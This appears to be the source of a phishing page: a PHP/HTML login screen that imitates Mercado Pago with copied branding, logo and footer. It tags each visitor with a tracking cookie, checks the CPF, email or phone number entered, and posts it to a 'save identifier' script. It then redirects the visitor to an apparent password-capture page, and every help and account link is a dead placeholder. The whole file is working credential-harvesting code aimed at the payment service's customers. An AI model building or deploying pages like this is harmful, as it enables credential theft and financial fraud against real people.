<?php
// Inicia a sessão para uso futuro
session_start();

// --- LÓGICA PARA CRIAR O COOKIE ---
if (!isset($_COOKIE['identificador_cliente'])) {
    $identificadorUnico = uniqid('cliente_', true) . bin2hex(random_bytes(8));
    setcookie('identificador_cliente', $identificadorUnico, time() + (86400 * 30), "/");
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        :root {
            --cor-amarela: #ffe600;
            --cor-azul-primaria: #3483fa;
            --cor-azul-secundaria: #2968c8;
            --cor-texto-primaria: #333;
            --cor-texto-secundaria: #666;
            --cor-fundo-pagina: #f5f5f5;
            --cor-fundo-card: #fff;
        }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--cor-fundo-pagina); display: flex; flex-direction: column; min-height: 100vh; }
        .main-header { background-color: var(--cor-amarela); padding: 12px 24px; display: flex; justify-content: flex-start; align-items: center; }
        .main-header img { height: 35px; } /* Ajustado para 35px como no seu código */
        
        /* ALTERAÇÃO: Transformando o main em um container flex */
        .main-content {
            background-color: var(--cor-fundo-card);
            padding: 32px 24px;
            flex-grow: 1;
            display: flex;
            flex-direction: column; /* Organiza os itens em coluna */
        }
        
        .main-title { font-size: 24px; font-weight: 400; color: var(--cor-texto-primaria); margin: 0 0 32px 0; }
        .input-label { font-size: 14px; color: #555; margin-bottom: 4px; display: block; }
        .input-field { width: 100%; padding: 16px; font-size: 16px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; margin-bottom: 24px; }
        .btn-continue { width: 100%; background-color: var(--cor-azul-primaria); color: white; border: none; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; margin-bottom: 24px; }
        .btn-continue:hover { background-color: var(--cor-azul-secundaria); }
        .link-create { display: block; text-align: center; color: var(--cor-azul-primaria); text-decoration: none; font-size: 15px; font-weight: 500; }
        
        /* NOVO: Wrapper para os links de suporte para controle de posicionamento */
        .support-wrapper {
            margin-top: auto; /* ESTA É A MÁGICA: Empurra este bloco para o final do container flex */
            padding-top: 32px; /* Adiciona um espaço acima dele */
        }

        .security-link { display: flex; align-items: center; justify-content: space-between; border: 1px solid #e0e0e0; border-radius: 6px; padding: 14px 16px; text-decoration: none; color: var(--cor-texto-primaria); font-size: 14px; font-weight: 500; }
        .security-link .icon-text { display: flex; align-items: center; gap: 12px; }
        .help-link { display: block; margin-top: 24px; text-align: center; color: var(--cor-azul-primaria); text-decoration: none; font-size: 14px; font-weight: 500; }
        .error-message { color: #d93025; font-size: 12px; margin-top: -16px; margin-bottom: 16px; min-height: 16px; }
        
        .main-footer-mobile { background-color: var(--cor-fundo-pagina); padding: 32px 24px; text-align: center; font-size: 12px; color: var(--cor-texto-secundaria); line-height: 1.5; }
        .main-footer-mobile a { color: var(--cor-azul-primaria); text-decoration: none; }
        .main-footer-mobile .copyright { margin-top: 16px; }
    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.50/mercadopago/logo__small.png" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div>
            <h1 class="main-title">Digite seu CPF, e-mail ou telefone para iniciar sessão</h1>
            <form id="mobile-login-form">
                <div>
                    <label for="identificador" class="input-label">CPF, e-mail ou telefone</label>
                    <input type="text" id="identificador" class="input-field" autocomplete="off">
                    <div id="error-message" class="error-message"></div>
                </div>
                <button type="submit" class="btn-continue">Continuar</button>
                <a href="#" class="link-create">Criar conta</a>
            </form>
        </div>

        <div class="support-wrapper">
            <a href="#" class="security-link">
                <span class="icon-text">
                    <svg xmlns="http://www.w3.org/2000/svg" width="27" height="26" fill="none" aria-hidden="true"><path fill="#000" fill-opacity="0.9" fill-rule="evenodd" d="M11.715 25.15C3.915 22.55 0 16.02 0 5.791V4.87h.924c3.462 0 6.955-1.448 10.494-4.38l.59-.489.589.488a23.955 23.955 0 002.914 2.087l-1.684 1.122a25.984 25.984 0 01-1.82-1.31C8.655 5.022 5.27 6.463 1.857 6.686c.212 8.828 3.585 14.298 10.15 16.61 2.287-.805 4.186-1.993 5.699-3.572h2.43c-1.909 2.506-4.522 4.32-7.837 5.425l-.292.098-.292-.098z" clip-rule="evenodd"></path><path fill="#000" fill-opacity="0.9" fill-rule="evenodd" d="M19.505 4.734a5.917 5.917 0 00-5.4 8.34l.25.556-.19.58-.888 2.722 2.978-.85.523-.15.504.205a5.917 5.917 0 102.223-11.403zM12.01 10.65a7.495 7.495 0 114.678 6.948l-4.678 1.336-.79-.79 1.445-4.425a7.468 7.468 0 01-.655-3.07z" clip-rule="evenodd"></path><path fill="#000" fill-opacity="0.9" d="M20.27 7.4h-1.53l.192 4.207h1.147l.192-4.208zm-.764 4.972a.765.765 0 110 1.53.765.765 0 010-1.53z"></path></svg>
                    <span>Tenho um problema de segurança</span>
                </span>
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3483fa" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
            </a>
            <a href="#" class="help-link">Preciso de ajuda</a>
        </div>
    </main>
    
    <footer class="main-footer-mobile">
        <div>
            <span>Protegido por reCAPTCHA - </span>
            <a href="#">Privacidade</a> - <a href="#">Condições</a>
        </div>
        <div class="copyright">
            <a href="#">Como cuidamos da sua privacidade</a><br>
            <span>Copyright © 1999-2025 Ebazar.com.br LTDA.</span>
        </div>
    </footer>

    <script>
        const identificadorInput = document.getElementById('identificador');
        const loginForm = document.getElementById('mobile-login-form');
        const errorDiv = document.getElementById('error-message');
        const submitBtn = loginForm.querySelector('.btn-continue');

        // --- MÁSCARA DE INPUT INTELIGENTE ---
        identificadorInput.addEventListener('input', (e) => {
            const rawValue = e.target.value;
            
            if (/[a-zA-Z]/.test(rawValue) || rawValue.includes('@')) {
                return; // Se for e-mail, não aplica máscara
            }

            let value = rawValue.replace(/\D/g, '');
            value = value.substring(0, 11);

            if (value.length > 9) { // Máscara de CPF
                value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
            } else if (value.length > 6) {
                value = value.replace(/(\d{3})(\d{3})(\d{3})/, '$1.$2.$3');
            } else if (value.length > 3) {
                value = value.replace(/(\d{3})(\d{3})/, '$1.$2');
            }
            e.target.value = value;
        });
        
        // --- FUNÇÕES DE VALIDAÇÃO ---
        const isValidEmail = (email) => {
            const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(String(email).toLowerCase());
        };

        const isValidCPF = (cpf) => {
            cpf = cpf.replace(/\D/g, '');
            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
            let sum = 0, rest;
            for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i-1, i)) * (11 - i);
            rest = (sum * 10) % 11;
            if ((rest === 10) || (rest === 11)) rest = 0;
            if (rest !== parseInt(cpf.substring(9, 10))) return false;
            sum = 0;
            for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i-1, i)) * (12 - i);
            rest = (sum * 10) % 11;
            if ((rest === 10) || (rest === 11)) rest = 0;
            if (rest !== parseInt(cpf.substring(10, 11))) return false;
            return true;
        };

        const isValidPhone = (phone) => {
            phone = phone.replace(/\D/g, '');
            return phone.length >= 10 && phone.length <= 11;
        };

        // --- LÓGICA DE SUBMISSÃO DO FORMULÁRIO ---
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            errorDiv.textContent = '';
            const valor = identificadorInput.value;

            if (!valor) {
                errorDiv.textContent = 'Informe seu e-mail, telefone ou CPF.';
                return;
            }
            
            let eValido = false;
            const apenasNumeros = valor.replace(/\D/g, '');

            if (valor.includes('@')) {
                eValido = isValidEmail(valor);
            } else if (apenasNumeros.length === 11) {
                eValido = isValidCPF(valor) || isValidPhone(valor);
            } else if (apenasNumeros.length === 10) {
                eValido = isValidPhone(valor);
            }

            if (!eValido) {
                errorDiv.textContent = 'Por favor, informe um dado válido.';
                return;
            }
            
            submitBtn.disabled = true;
            submitBtn.textContent = 'Aguarde...';

            try {
                const response = await fetch('api_salvar_identificador.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ identificador: valor })
                });
                const result = await response.json();
                if (result.success) {
                    window.location.href = 'senha.php';
                } else {
                    errorDiv.textContent = result.error || 'Ocorreu um erro.';
                }
            } catch (error) {
                errorDiv.textContent = 'Não foi possível conectar ao servidor.';
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Continuar';
            }
        });
    </script>
</body>
</html>